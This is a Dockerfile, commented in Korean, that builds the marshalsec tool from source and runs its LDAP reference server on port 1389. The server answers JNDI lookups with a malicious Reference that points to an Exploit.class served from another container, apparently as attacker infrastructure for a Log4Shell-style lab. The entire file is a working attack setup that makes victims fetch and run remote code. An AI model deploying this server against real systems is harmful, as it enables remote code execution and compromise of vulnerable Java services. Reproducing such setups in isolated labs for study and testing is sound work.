# JNDI 조회를 가로채 악성 Reference를 반환하는 LDAP 서버.
# marshalsec 프로젝트를 소스에서 직접 빌드한다 (Maven Central에 배포된 아티팩트가 없음).
FROM maven:3.6-jdk-8

WORKDIR /build

RUN git clone --depth 1 https://github.com/mbechler/marshalsec.git .
RUN mvn -q clean package -DskipTests

WORKDIR /build/target

EXPOSE 1389

# http-server 컨테이너의 8000번 포트에서 Exploit.class 를 서빙한다는 전제.
ENTRYPOINT ["sh", "-c", "java -cp $(ls marshalsec-*-all.jar) marshalsec.jndi.LDAPRefServer 'http://http-server:8000/#Exploit'"]

